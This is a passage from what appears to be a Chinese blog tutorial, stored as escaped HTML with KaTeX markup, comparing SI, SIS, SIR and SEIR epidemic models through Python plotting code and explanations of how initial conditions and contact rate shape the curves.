punctuation\">,</span>mu<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># SEIR 模型</span>\n\n<span class=\"token comment\"># 输出绘图</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"lamda={}\\tmu={}\\tsigma={}\\t(1-1/sig)={}\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>lamda<span class=\"token punctuation\">,</span>mu<span class=\"token punctuation\">,</span>sigma<span class=\"token punctuation\">,</span>fsig<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nplt<span class=\"token punctuation\">.</span>title<span class=\"token punctuation\">(</span><span class=\"token string\">\"Comparison among SI, SIS, SIR and SEIR models\"</span><span class=\"token punctuation\">)</span>\nplt<span class=\"token punctuation\">.</span>xlabel<span class=\"token punctuation\">(</span><span class=\"token string\">\'t-youcans\'</span><span class=\"token punctuation\">)</span>\nplt<span class=\"token punctuation\">.</span>axis<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> tEnd<span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1.1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\nplt<span class=\"token punctuation\">.</span>plot<span class=\"token punctuation\">(</span>t<span class=\"token punctuation\">,</span> ySI<span class=\"token punctuation\">,</span> <span class=\"token string\">\'cadetblue\'</span><span class=\"token punctuation\">,</span> label<span class=\"token operator\">=</span><span class=\"token string\">\'i(t)-SI\'</span><span class=\"token punctuation\">)</span>\nplt<span class=\"token punctuation\">.</span>plot<span class=\"token punctuation\">(</span>t<span class=\"token punctuation\">,</span> ySIS<span class=\"token punctuation\">,</span> <span class=\"token string\">\'steelblue\'</span><span class=\"token punctuation\">,</span> label<span class=\"token operator\">=</span><span class=\"token string\">\'i(t)-SIS\'</span><span class=\"token punctuation\">)</span>\nplt<span class=\"token punctuation\">.</span>plot<span class=\"token punctuation\">(</span>t<span class=\"token punctuation\">,</span> ySIR<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\'cornflowerblue\'</span><span class=\"token punctuation\">,</span> label<span class=\"token operator\">=</span><span class=\"token string\">\'i(t)-SIR\'</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># plt.plot(t, 1-ySIR[:,0]-ySIR[:,1], \'cornflowerblue\', label=\'r(t)-SIR\')</span>\nplt<span class=\"token punctuation\">.</span>plot<span class=\"token punctuation\">(</span>t<span class=\"token punctuation\">,</span> ySEIR<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\'--\'</span><span class=\"token punctuation\">,</span> color<span class=\"token operator\">=</span><span class=\"token string\">\'darkviolet\'</span><span class=\"token punctuation\">,</span> label<span class=\"token operator\">=</span><span class=\"token string\">\'s(t)-SIR\'</span><span class=\"token punctuation\">)</span>\nplt<span class=\"token punctuation\">.</span>plot<span class=\"token punctuation\">(</span>t<span class=\"token punctuation\">,</span> ySEIR<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\'-.\'</span><span class=\"token punctuation\">,</span> color<span class=\"token operator\">=</span><span class=\"token string\">\'orchid\'</span><span class=\"token punctuation\">,</span> label<span class=\"token operator\">=</span><span class=\"token string\">\'e(t)-SIR\'</span><span class=\"token punctuation\">)</span>\nplt<span class=\"token punctuation\">.</span>plot<span class=\"token punctuation\">(</span>t<span class=\"token punctuation\">,</span> ySEIR<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\'-\'</span><span class=\"token punctuation\">,</span> color<span class=\"token operator\">=</span><span class=\"token string\">\'m\'</span><span class=\"token punctuation\">,</span> label<span class=\"token operator\">=</span><span class=\"token string\">\'i(t)-SIR\'</span><span class=\"token punctuation\">)</span>\nplt<span class=\"token punctuation\">.</span>plot<span class=\"token punctuation\">(</span>t<span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token operator\">-</span>ySEIR<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">-</span>ySEIR<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token operator\">-</span>ySEIR<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\':\'</span><span class=\"token punctuation\">,</span> color<span class=\"token operator\">=</span><span class=\"token string\">\'palevioletred\'</span><span class=\"token punctuation\">,</span> label<span class=\"token operator\">=</span><span class=\"token string\">\'r(t)-SIR\'</span><span class=\"token punctuation\">)</span>\nplt<span class=\"token punctuation\">.</span>legend<span class=\"token punctuation\">(</span>loc<span class=\"token operator\">=</span><span class=\"token string\">\'right\'</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># youcans</span>\nplt<span class=\"token punctuation\">.</span>show<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n</code></pre> \n <br> \n <h3><a id=\"24_SI_SISSIR_SEIR__211\"></a>2.4 SI /SIS/SIR 模型与SEIR 模型的比较</h3> \n <p><img src=\"https://img-blog.csdnimg.cn/20210615201057689.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lvdWNhbnM=,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\"></p> \n <p>例程 2.3 的参数和初值为：<span class=\"katex--inline\"><span class=\"katex\"><span class=\"katex-mathml\"> λ = 0.3 ， δ = 0.03 ， μ = 0.06 ， ( s 0 , e 0 , i 0 ) = ( 0.001 , 0.001 , 0.998 ) \\lambda=0.3，\\delta=0.03，\\mu=0.06，(s_0,e_0,i_0)=(0.001,0.001,0.998) </span><span class=\"katex-html\"><span class=\"base\"><span class=\"strut\" style=\"height: 0.69444em; vertical-align: 0em;\"></span><span class=\"mord mathdefault\">λ</span><span class=\"mspace\" style=\"margin-right: 0.277778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right: 0.277778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height: 0.69444em; vertical-align: 0em;\"></span><span class=\"mord\">0</span><span class=\"mord\">.</span><span class=\"mord\">3</span><span class=\"mord cjk_fallback\">，</span><span class=\"mord mathdefault\" style=\"margin-right: 0.03785em;\">δ</span><span class=\"mspace\" style=\"margin-right: 0.277778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right: 0.277778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height: 0.83888em; vertical-align: -0.19444em;\"></span><span class=\"mord\">0</span><span class=\"mord\">.</span><span class=\"mord\">0</span><span class=\"mord\">3</span><span class=\"mord cjk_fallback\">，</span><span class=\"mord mathdefault\">μ</span><span class=\"mspace\" style=\"margin-right: 0.277778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right: 0.277778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height: 1em; vertical-align: -0.25em;\"></span><span class=\"mord\">0</span><span class=\"mord\">.</span><span class=\"mord\">0</span><span class=\"mord\">6</span><span class=\"mord cjk_fallback\">，</span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathdefault\">s</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 0.301108em;\"><span class=\"\" style=\"top: -2.55em; margin-left: 0em; margin-right: 0.05em;\"><span class=\"pstrut\" style=\"height: 2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">0</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 0.15em;\"><span class=\"\"></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right: 0.166667em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\">e</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 0.301108em;\"><span class=\"\" style=\"top: -2.55em; margin-left: 0em; margin-right: 0.05em;\"><span class=\"pstrut\" style=\"height: 2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">0</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 0.15em;\"><span class=\"\"></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right: 0.166667em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\">i</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 0.301108em;\"><span class=\"\" style=\"top: -2.55em; margin-left: 0em; margin-right: 0.05em;\"><span class=\"pstrut\" style=\"height: 2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">0</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 0.15em;\"><span class=\"\"></span></span></span></span></span></span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right: 0.277778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right: 0.277778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height: 1em; vertical-align: -0.25em;\"></span><span class=\"mopen\">(</span><span class=\"mord\">0</span><span class=\"mord\">.</span><span class=\"mord\">0</span><span class=\"mord\">0</span><span class=\"mord\">1</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right: 0.166667em;\"></span><span class=\"mord\">0</span><span class=\"mord\">.</span><span class=\"mord\">0</span><span class=\"mord\">0</span><span class=\"mord\">1</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right: 0.166667em;\"></span><span class=\"mord\">0</span><span class=\"mord\">.</span><span class=\"mord\">9</span><span class=\"mord\">9</span><span class=\"mord\">8</span><span class=\"mclose\">)</span></span></span></span></span>，上图为例程的运行结果。</p> \n <p>曲线 i(t)-SI 是 SI 模型的结果，患病者比例急剧增长到 1.0，所有人都被传染而变成患病者。</p> \n <p>曲线 i(t)-SIS 是 SIS 模型的结果，患病者比例快速增长并收敛到某个常数，即稳态特征值 <span class=\"katex--inline\"><span class=\"katex\"><span class=\"katex-mathml\"> i ∞ = 1 − μ / λ = 0.8 i_\\infty=1-\\mu/\\lambda = 0.8 </span><span class=\"katex-html\"><span class=\"base\"><span class=\"strut\" style=\"height: 0.80952em; vertical-align: -0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\">i</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 0.151392em;\"><span class=\"\" style=\"top: -2.55em; margin-left: 0em; margin-right: 0.05em;\"><span class=\"pstrut\" style=\"height: 2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">∞</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 0.15em;\"><span class=\"\"></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right: 0.277778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right: 0.277778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height: 0.72777em; vertical-align: -0.08333em;\"></span><span class=\"mord\">1</span><span class=\"mspace\" style=\"margin-right: 0.222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right: 0.222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height: 1em; vertical-align: -0.25em;\"></span><span class=\"mord mathdefault\">μ</span><span class=\"mord\">/</span><span class=\"mord mathdefault\">λ</span><span class=\"mspace\" style=\"margin-right: 0.277778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right: 0.277778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height: 0.64444em; vertical-align: 0em;\"></span><span class=\"mord\">0</span><span class=\"mord\">.</span><span class=\"mord\">8</span></span></span></span></span>，表明疫情稳定，并将长期保持一定的患病率，称为地方病平衡点。</p> \n <p>曲线 i(t)-SIR 是 SIR 模型的结果，患病者比例 i(t) 先上升达到峰值，然后再逐渐减小趋近于常数。</p> \n <p>曲线 s(t)-SEIR、e(t)-SEIR、i(t)-SEIR、r(t)-SEIR 分别表示 SEIR模型中易感者（S类）、潜伏者（E类）、患病者（I类）和康复者（R 类）人群的占比。</p> \n <p>图中易感者比例 s(t) 单调递减并收敛到接近于 0 的稳定值。潜伏者比例 e(t) 曲线存在波峰，先逐渐上升而达到峰值，然后再逐渐减小，最终趋于 0。患病者比例 i(t) 曲线与潜伏者比例曲线类似，上升达到峰值后逐渐减小，最终趋于 0；但患病者比例曲线发展、达峰的时间比潜伏者曲线要晚一些，峰值强度也较低。康复者比例 r(i) 单调递增并收敛到非零的稳态值。以上分析只是对本图进行的讨论，并非普遍结论，取决于具体参数条件。</p> \n <p>比较相同参数条件下 SIR 和 SEIR 模型的结果，SIR 模型中患病者比例 i(t) 的波形起点、峰值和终点到来的时间都显著早于 SEIR 模型，峰值强度也高于 SEIR 模型。这表明具有潜伏期的传染病，疫情发生和峰值的到来要晚于没有潜伏期的传染病，而且持续时间更长。</p> \n <hr> \n <br> \n <h2><a id=\"3_SEIR__232\"></a>3. SEIR 模型参数的影响</h2> \n <p>SEIR 模型中有日接触率 <span class=\"katex--inline\"><span class=\"katex\"><span class=\"katex-mathml\"> λ \\lambda </span><span class=\"katex-html\"><span class=\"base\"><span class=\"strut\" style=\"height: 0.69444em; vertical-align: 0em;\"></span><span class=\"mord mathdefault\">λ</span></span></span></span></span> 、日发病率 <span class=\"katex--inline\"><span class=\"katex\"><span class=\"katex-mathml\"> δ \\delta </span><span class=\"katex-html\"><span class=\"base\"><span class=\"strut\" style=\"height: 0.69444em; vertical-align: 0em;\"></span><span class=\"mord mathdefault\" style=\"margin-right: 0.03785em;\">δ</span></span></span></span></span> 和日治愈率 <span class=\"katex--inline\"><span class=\"katex\"><span class=\"katex-mathml\"> μ \\mu </span><span class=\"katex-html\"><span class=\"base\"><span class=\"strut\" style=\"height: 0.625em; vertical-align: -0.19444em;\"></span><span class=\"mord mathdefault\">μ</span></span></span></span></span> 三个参数，还有 <span class=\"katex--inline\"><span class=\"katex\"><span class=\"katex-mathml\"> i 0 、 e 0 、 s 0 i_0、e_0、s_0 </span><span class=\"katex-html\"><span class=\"base\"><span class=\"strut\" style=\"height: 0.80952em; vertical-align: -0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\">i</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 0.301108em;\"><span class=\"\" style=\"top: -2.55em; margin-left: 0em; margin-right: 0.05em;\"><span class=\"pstrut\" style=\"height: 2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">0</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 0.15em;\"><span class=\"\"></span></span></span></span></span></span><span class=\"mord cjk_fallback\">、</span><span class=\"mord\"><span class=\"mord mathdefault\">e</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 0.301108em;\"><span class=\"\" style=\"top: -2.55em; margin-left: 0em; margin-right: 0.05em;\"><span class=\"pstrut\" style=\"height: 2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">0</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 0.15em;\"><span class=\"\"></span></span></span></span></span></span><span class=\"mord cjk_fallback\">、</span><span class=\"mord\"><span class=\"mord mathdefault\">s</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 0.301108em;\"><span class=\"\" style=\"top: -2.55em; margin-left: 0em; margin-right: 0.05em;\"><span class=\"pstrut\" style=\"height: 2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">0</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 0.15em;\"><span class=\"\"></span></span></span></span></span></span></span></span></span></span> 等初始条件，我们先用单因素分析的方法来观察参数条件对于疫情传播的影响。</p> \n <h3><a id=\"31__i_0e_0s_0__236\"></a>3.1 初值条件 <span class=\"katex--inline\"><span class=\"katex\"><span class=\"katex-mathml\"> i 0 、 e 0 、 s 0 i_0、e_0、s_0 </span><span class=\"katex-html\"><span class=\"base\"><span class=\"strut\" style=\"height: 0.80952em; vertical-align: -0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\">i</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 0.301108em;\"><span class=\"\" style=\"top: -2.55em; margin-left: 0em; margin-right: 0.05em;\"><span class=\"pstrut\" style=\"height: 2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">0</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 0.15em;\"><span class=\"\"></span></span></span></span></span></span><span class=\"mord cjk_fallback\">、</span><span class=\"mord\"><span class=\"mord mathdefault\">e</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 0.301108em;\"><span class=\"\" style=\"top: -2.55em; margin-left: 0em; margin-right: 0.05em;\"><span class=\"pstrut\" style=\"height: 2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">0</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 0.15em;\"><span class=\"\"></span></span></span></span></span></span><span class=\"mord cjk_fallback\">、</span><span class=\"mord\"><span class=\"mord mathdefault\">s</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 0.301108em;\"><span class=\"\" style=\"top: -2.55em; margin-left: 0em; margin-right: 0.05em;\"><span class=\"pstrut\" style=\"height: 2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">0</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 0.15em;\"><span class=\"\"></span></span></span></span></span></span></span></span></span></span> 初始条件的影响</h3> \n <p>SEIR 模型中有 <span class=\"katex--inline\"><span class=\"katex\"><span class=\"katex-mathml\"> i 0 、 e 0 、 s 0 i_0、e_0、s_0 </span><span class=\"katex-html\"><span class=\"base\"><span class=\"strut\" style=\"height: 0.80952em; vertical-align: -0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\">i</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 0.301108em;\"><span class=\"\" style=\"top: -2.55em; margin-left: 0em; margin-right: 0.05em;\"><span class=\"pstrut\" style=\"height: 2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">0</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 0.15em;\"><span class=\"\"></span></span></span></span></span></span><span class=\"mord cjk_fallback\">、</span><span class=\"mord\"><span class=\"mord mathdefault\">e</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 0.301108em;\"><span class=\"\" style=\"top: -2.55em; margin-left: 0em; margin-right: 0.05em;\"><span class=\"pstrut\" style=\"height: 2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">0</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 0.15em;\"><span class=\"\"></span></span></span></span></span></span><span class=\"mord cjk_fallback\">、</span><span class=\"mord\"><span class=\"mord mathdefault\">s</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 0.301108em;\"><span class=\"\" style=\"top: -2.55em; margin-left: 0em; margin-right: 0.05em;\"><span class=\"pstrut\" style=\"height: 2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">0</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 0.15em;\"><span class=\"\"></span></span></span></span></span></span></span></span></span></span> 等 3个初始条件，组合众多无法穷尽。考虑实际情况中，疫情初始阶段尚无康复者，而潜伏者比例往往高于确诊的发病者，我们假定 <span class=\"katex--inline\"><span class=\"katex\"><span class=\"katex-mathml\"> e 0 / i 0 = 2 ， r 0 = 0 e_0/i_0=2，r_0=0 </span><span class=\"katex-html\"><span class=\"base\"><span class=\"strut\" style=\"height: 1em; vertical-align: -0.25em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\">e</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 0.301108em;\"><span class=\"\" style=\"top: -2.55em; margin-left: 0em; margin-right: 0.05em;\"><span class=\"pstrut\" style=\"height: 2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">0</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 0.15em;\"><span class=\"\"></span></span></span></span></span></span><span class=\"mord\">/</span><span class=\"mord\"><span class=\"mord mathdefault\">i</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 0.301108em;\"><span class=\"\" style=\"top: -2.55em; margin-left: 0em; margin-right: 0.05em;\"><span class=\"pstrut\" style=\"height: 2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">0</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 0.15em;\"><span class=\"\"></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right: 0.277778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right: 0.277778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height: 0.79444em; vertical-align: -0.15em;\"></span><span class=\"mord\">2</span><span class=\"mord cjk_fallback\">，</span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right: 0.02778em;\">r</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 0.301108em;\"><span class=\"\" style=\"top: -2.55em; margin-left: -0.02778em; margin-right: 0.05em;\"><span class=\"pstrut\" style=\"height: 2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">0</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 0.15em;\"><span class=\"\"></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right: 0.277778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right: 0.277778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height: 0.64444em; vertical-align: 0em;\"></span><span class=\"mord\">0</span></span></span></span></span>，考察不同 <span class=\"katex--inline\"><span class=\"katex\"><span class=\"katex-mathml\"> i 0 i_0 </span><span class=\"katex-html\"><span class=\"base\"><span class=\"strut\" style=\"height: 0.80952em; vertical-align: -0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\">i</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 0.301108em;\"><span class=\"\" style=\"top: -2.55em; margin-left: 0em; margin-right: 0.05em;\"><span class=\"pstrut\" style=\"height: 2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">0</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 0.15em;\"><span class=\"\"></span></span></span></span></span></span></span></span></span></span> 时的疫情传播情况。<br> <img src=\"https://img-blog.csdnimg.cn/20210615201123901.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lvdWNhbnM=,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\"></p> \n <p>通过对于该参数下不同的患病者、潜伏者比例初值条件的模拟，可以看到患病者、潜伏者比例的初值条件对疫情发生、达峰、结束的时间早晚具有直接影响，但对疫情曲线的形态和特征影响不大。不同初值条件下的疫情曲线，几乎是沿着时间指标平移的。</p> \n <p>这说明如果不进行治疗防控等人为干预，疫情传播过程与初始患病者、潜伏者比例关系并不大，该来的总会来。</p> \n <p>图中患病率达到高峰后逐步降低，直至趋近于 0；易感率在疫情爆发后迅速下降，直至趋近于 0。但这一现象是基于具体的参数条件的观察，仅由该图并不能确定其是否普遍规律。</p> \n <br> \n <h3><a id=\"32__lambda__249\"></a>3.2 日接触率 <span class=\"katex--inline\"><span class=\"katex\"><span class=\"katex-mathml\"> λ \\lambda </span><span class=\"katex-html\"><span class=\"base\"><span class=\"strut\" style=\"height: 0.69444em; vertical-align: 0em;\"></span><span class=\"mord mathdefault\">λ</span></span></span></span></span> 的影响</h3> \n <p>首先考察日接触率 <span class=\"katex--inline\"><span class=\"katex\"><span class=\"katex-mathml\"> λ \\lambda </span><span class=\"katex-html\"><span class=\"base\"><span class=\"strut\" style=\"height: 0.69444em; vertical-align: 0em;\"></span><span class=\"mord mathdefault\">λ</span></span></span></span></span> 的影响。</p> \n <p>保持参数 <span class=\"katex--inline\"><span class=\"katex\"><span class=\"katex-mathml\"> δ = 0.1 ， μ = 0.06 , ( i 0 = 0.001 , e 0 = 0.002 , s 0 = 0.997 ) \\delta =0.1，\\mu=0.06, (i_0=0.001,e_0=0.002,s_0=0.997) </span><span class=\"katex-html\"><span class=\"base\"><span class=\"strut\" style=\"height: 0.69444em; vertical-align: 0em;\"></span><span class=\"mord mathdefault\" style=\"margin-right: 0.03785em;\">δ</span><span class=\"mspace\" style=\"margin-right: 0.277778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right: 0.277778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height: 0.83888em; vertical-align: -0.19444em;\"></span><span class=\"mord\">0</span><span class=\"mord\">.</span><span class=\"mord\">1</span><span class=\"mord cjk_fallback\">，</span><span class=\"mord mathdefault\">μ</span><span class=\"mspace\" style=\"margin-right: 0.277778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right: 0.277778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height: 1em; vertical-align: -0.25em;\"></span><span class=\"mord\">0</span><span class=\"mord\">.</span><span class=\"mord\">0</span><span class=\"mord\">6</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right: 0.166667em;\"></span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathdefault\">i</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 0.301108em;\"><span class=\"\" style=\"top: -2.55em; margin-left: 0em; margin-right: 0.05em;\"><span class=\"pstrut\" style=\"height: 2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">0</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 0.15em;\"><span class=\"\"></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right: 0.277778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right: 0.277778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height: 0.83888em; vertical-align: -0.19444em;\"></span><span class=\"mord\">0</span><span class=\"mord\">.</span><span class=\"mord\">0</span><span class=\"mord\">0</span><span class=\"mord\">1</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right: 0.166667em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\">e</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 0.301108em;\"><span class=\"\" style=\"top: -2.55em; margin-left: 0em; margin-right: 0.05em;\"><span class=\"pstrut\" style=\"height: 2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">0</span></span></span></span><span class=\"vlist-s\">​</span></span><span 